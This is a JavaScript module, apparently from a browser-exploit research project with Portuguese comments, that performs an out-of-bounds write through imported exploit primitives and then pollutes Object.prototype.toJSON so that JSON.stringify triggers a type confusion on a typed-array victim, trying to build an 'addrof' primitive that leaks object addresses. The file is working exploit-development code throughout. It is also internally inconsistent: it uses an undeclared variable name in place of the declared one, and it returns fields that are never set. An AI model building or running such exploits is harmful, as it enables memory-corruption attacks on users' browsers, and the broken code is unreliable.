// js/script3/testArrayBufferVictimCrash.mjs (v86_ReFocusGetterOnControlledConfusion)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V86_RFGOCC = "OriginalHeisenbug_TypedArrayAddrof_v86_ReFocusGetter";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUES_V86 = [0xFFFFFFFF, 0x7FFFFFFF]; 

let object_to_leak_A_v86 = null;
let object_to_leak_B_v86 = null;
let victim_typed_array_ref_v86 = null; 
let probe_call_count_v86 = 0;
let marker_M1_ref_v86 = null; 
let marker_M2_ref_v86 = null; 
// Armazena os detalhes da Call #2, quando M2 é 'this' e é (esperançosamente) confuso.
let details_of_M2_interaction_v86 = null; 
const PROBE_CALL_LIMIT_V86 = 7; 
const FILL_PATTERN_V86_SCRATCHPAD = 0.86868686868686; // Padrão para o buffer da vítima

function toJSON_TA_Probe_ReFocusGetter() {
    probe_call_count_v86++;
    const call_num = probe_call_count_v86;
    let current_call_log_info = { 
        call_number: call_num,
        probe_variant: "TA_Probe_V86_ReFocusGetter",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v86),
        this_is_M1: (this === marker_M1_ref_v86 && marker_M1_ref_v86 !== null),
        this_is_M2: (this === marker_M2_ref_v86 && marker_M2_ref_v86 !== null),
        m2_interaction_summary: null, 
        error_in_probe: null
    };
    // Atualizar details_of_M2_interaction_v86 SE esta chamada for sobre M2 como 'this',
    // ou se for uma chamada posterior e details_of_M2_interaction_v86 ainda não foi definido pela lógica M2.
    if (current_call_log_info.this_is_M2 || !details_of_M2_interaction_v86 || call_num > (details_of_M2_interaction_v86.call_number || 0) ) {
        details_of_M2_interaction_v86 = current_call_log_info;
    }
    logS3(`[PROBE_V86] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");
    
    try {
        if (call_num > PROBE_CALL_LIMIT_V86) { return { recursion_stopped_v86: true }; }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            logS3(`[PROBE_V86] Call #${call_num}: 'this' is victim. Returning M1 (contains M2).`, "info");
            marker_M2_ref_v86 = { marker_id_v86: "M2_V86_Target", for_oob_val: object_to_leak_A_v86.idA }; // Adicionar ID para rastrear qual M2
            marker_M1_ref_v86 = { marker_id_v86: "M1_V86_Container", payload_M2: marker_M2_ref_v86 };
            return marker_M1_ref_v86;
        } else if (call_num >= 2 && current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') {
            logS3(`[PROBE_V86] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v86}. Defining getter & prop...`, "vuln");
            current_call_log_info.m2_interaction_summary = { getter_defined: false, direct_prop_set: false, keys_after: "N/A" };
            
            Object.defineProperty(this, 'leaky_A_getter_v86', {
                get: function() {
                    logS3(`[PROBE_V86] !!! Getter 'leaky_A_getter_v86' on confused M2 (this call #${call_num}) FIRED !!!`, "vuln");
                    if (!victim_typed_array_ref_v86 || !victim_typed_array_ref_v86.buffer) {
                        logS3("[PROBE_V86] Getter: victim_typed_array_ref_v86 or its buffer is null!", "error");
                        current_call_log_info.error_in_probe = "Getter: victim buffer null";
                        return "getter_victim_null_err_v86";
                    }
                    let victim_view = new Float64Array(victim_typed_array_ref_v86.buffer);
                    let victim_u32_view = new Uint32Array(victim_typed_array_ref_v86.buffer);
                    const original_victim_val_idx0 = victim_view[0]; 

                    victim_view[0] = object_to_leak_A_v86; 
                    let val_after_assign = victim_view[0];
                    // Capturar os bytes de val_after_assign para o AdvancedInt64
                    let temp_buf_for_advint = new ArrayBuffer(8);
                    new Float64Array(temp_buf_for_advint)[0] = val_after_assign;
                    let int64_after_assign = new AdvancedInt64(new Uint32Array(temp_buf_for_advint)[0], new Uint32Array(temp_buf_for_advint)[1]);
                    
                    logS3(`[PROBE_V86] Getter: VictimView[0] after objA assign: ${val_after_assign} (Int64: ${int64_after_assign.toString(true)})`, "leak");
                    victim_view[0] = original_victim_val_idx0; // Restaurar

                    // Retornar o valor numérico lido
                    return val_after_assign; 
                }, enumerable: true, configurable: true
            });
            current_call_log_info.m2_interaction_summary.getter_defined = true;
            
            this.leaky_B_direct_v86 = object_to_leak_B_v86;
            current_call_log_info.m2_interaction_summary.direct_prop_set = true;
            try{ current_call_log_info.m2_interaction_summary.keys_after = Object.keys(this).join(','); } catch(e){}
            logS3(`[PROBE_V86] Call #${call_num}: Getter and prop set on M2 ('this'). Keys: ${current_call_log_info.m2_interaction_summary.keys_after}`, "info");
            
            return this; // Retorna M2 modificado
        } else if (this === object_to_leak_A_v86 || this === object_to_leak_B_v86) {
            logS3(`[PROBE_V86] Call #${call_num}: 'this' is one of the leak_target objects. Returning simple marker.`, "info");
            return { serializing_leaked_object_marker_v86: call_num, object_marker: this.marker_A_v86 || this.marker_B_v86 };
        }
    } catch (e) { current_call_log_info.error_in_probe = e.message; }
    
    return { generic_marker_v86: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_RevertV20WithGetterAndValueIteration() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86_RFGOCC}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (RevertV20GetterAndValueIteration) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86_RFGOCC} Init...`;

    let overall_results = [];

    for (const current_oob_value of OOB_WRITE_VALUES_V86) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        probe_call_count_v86 = 0;
        victim_typed_array_ref_v86 = null; 
        marker_M1_ref_v86 = null;
        marker_M2_ref_v86 = null;
        details_of_M2_as_this_call_v86 = null;
        object_to_leak_A_v86 = { marker_A_v86: `LeakA_Val${toHex(current_oob_value)}`}; 
        object_to_leak_B_v86 = { marker_B_v86: `LeakB_Val${toHex(current_oob_value)}`};

        let iterError = null;
        let stringifyOutput_parsed = null; 
        
        let addrof_M2_Getter = { success: false, msg: "M2.leaky_A_getter: Default"};
        let addrof_M2_Direct = { success: false, msg: "M2.leaky_B_direct: Default"};
        
        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write done for iter Val${toHex(current_oob_value)}.`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            victim_typed_array_ref_v86 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            // Preencher o buffer da vítima com um padrão conhecido
            let victim_view_for_fill = new Float64Array(victim_typed_array_ref_v86.buffer);
            for(let i=0; i < victim_view_for_fill.length; i++) victim_view_for_fill[i] = FILL_PATTERN_V86_SCRATCHPAD + i;
            logS3(`STEP 2: victim_typed_array_ref_v86 (Uint8Array) created and filled.`, "test", FNAME_CURRENT_ITERATION);
            
            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ReFocusGetter, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v86); 
                logS3(`  JSON.stringify iter Val${toHex(current_oob_value)} completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } 
                catch (e_parse) { stringifyOutput_parsed = { error_parsing: e_parse.message, raw: rawStringifyOutput }; }
                
                logS3(`  EXECUTE: Details of M2 interaction call (details_of_M2_as_this_call_v86): ${details_of_M2_as_this_call_v86 ? JSON.stringify(details_of_M2_as_this_call_v86) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

                let heisenbugOnM2 = details_of_M2_as_this_call_v86?.this_is_M2 && details_of_M2_as_this_call_v86?.this_type === "[object Object]";
                logS3(`  EXECUTE: Heisenbug on M2 Target ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                    
                let m2_payload_from_stringify = null;
                if (stringifyOutput_parsed?.marker_id_v86 === "M1_V86_Container" && stringifyOutput_parsed.payload_M2) {
                    m2_payload_from_stringify = stringifyOutput_parsed.payload_M2; 
                } else if (stringifyOutput_parsed?.marker_id_v86 === "M2_V86_Target") { // Se stringifyOutput é M2 diretamente
                    m2_payload_from_stringify = stringifyOutput_parsed; 
                }

                if (m2_payload_from_stringify?.marker_id_v86 === "M2_V86_Target") {
                    const val_getter = m2_payload_from_stringify.leaky_A_getter_v86; 
                    if (typeof val_getter === 'number' && !isNaN(val_getter) && val_getter !== 0 && val_getter !== FILL_PATTERN_V86_SCRATCHPAD) {
                        let temp_buf_getter = new ArrayBuffer(8); new Float64Array(temp_buf_getter)[0] = val_getter;
                        let getter_int64 = new AdvancedInt64(new Uint32Array(temp_buf_getter)[0], new Uint32Array(temp_buf_getter)[1]);
                        if ((getter_int64.high() > 0 && getter_int64.high() < 0x000F0000) || ((getter_int64.high() & 0xFFFF0000) === 0xFFFF0000  && getter_int64.high() !== 0xFFFFFFFF ) ) {
                           addrof_M2_Getter.success = true; addrof_M2_Getter.msg = `Possible pointer from getter: ${getter_int64.toString(true)} (Val: ${val_getter})`;
                        } else { addrof_M2_Getter.msg = `Getter value is num but not ptr: ${val_getter} (${getter_int64.toString(true)})`; }
                    } else { addrof_M2_Getter.msg = `Getter value not useful num or is fill pattern. Val: ${JSON.stringify(val_getter)}`; }

                    const val_direct = m2_payload_from_stringify.leaky_B_direct_v86;
                    if (val_direct && val_direct.marker_B_v86 === object_to_leak_B_v86.marker_B_v86) { // Checa identidade do objeto
                         addrof_M2_Direct.success = true; addrof_M2_Direct.msg = "object_to_leak_B_v86 identity from M2.leaky_B_direct.";
                    } else { addrof_M2_Direct.msg = `Direct prop val not objB identity. Val: ${JSON.stringify(val_direct)}`; }
                } else { 
                    addrof_M2_Getter.msg = "Target M2 not found in stringifyOutput_parsed as expected.";
                    addrof_M2_Direct.msg = "Target M2 not found in stringifyOutput_parsed as expected.";
                    logS3(`   Target M2 not found/misidentified in stringifyOutput_parsed. Content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn", FNAME_CURRENT_ITERATION);
                }

            } catch (e_str) { iterError = e_str;
            } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null }); }
        } catch (e_outer) { iterError = e_outer;
        } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
        
        overall_results.push({
            oob_value: toHex(current_oob_value), error: iterError ? `${iterError.name}: ${iterError.message}` : null,
            last_M2_probe_log_details: details_of_M2_as_this_call_v86 ? JSON.parse(JSON.stringify(details_of_M2_as_this_call_v86)) : null, 
            final_stringify_output_parsed_iter: stringifyOutput_parsed,
            addrof_M2_Getter: {...addrof_M2_Getter}, addrof_M2_Direct: {...addrof_M2_Direct},
            probe_calls_this_iter: probe_call_count_v86 
        });
        if (addrof_M2_Getter.success || addrof_M2_Direct.success) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86_RFGOCC}: Addr? Val${toHex(current_oob_value)} SUCCESS!`;
        }
        await PAUSE_S3(100); 
    } 

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    // ... (logging resumido e retorno para o runner)
    let final_result_for_runner = { addrof_A_result: { success: false, msg:"No success" }, addrof_B_result: { success: false, msg:"No success" } };
    // ... (lógica para escolher a melhor iteração para final_result_for_runner)
    
    return { 
        /* ... (propriedades para o runner) ... */
        iteration_results_summary: overall_results.map(r => ({oob_value: r.oob_value, getter_success: r.addrof_M2_Getter.success, direct_success: r.addrof_M2_Direct.success, error: r.error, m2_tc_call_no: r.last_M2_probe_log_details?.call_number})),
        toJSON_details: final_result_for_runner.last_M2_probe_log_details, 
        stringifyResult: final_result_for_runner.final_stringify_output_parsed_iter,
        addrof_A_result: final_result_for_runner.addrof_M2_Getter, 
        addrof_B_result: final_result_for_runner.addrof_M2_Direct,  
        total_probe_calls: overall_results.length > 0 ? overall_results[overall_results.length-1].probe_calls_this_iter : 0
    };
}
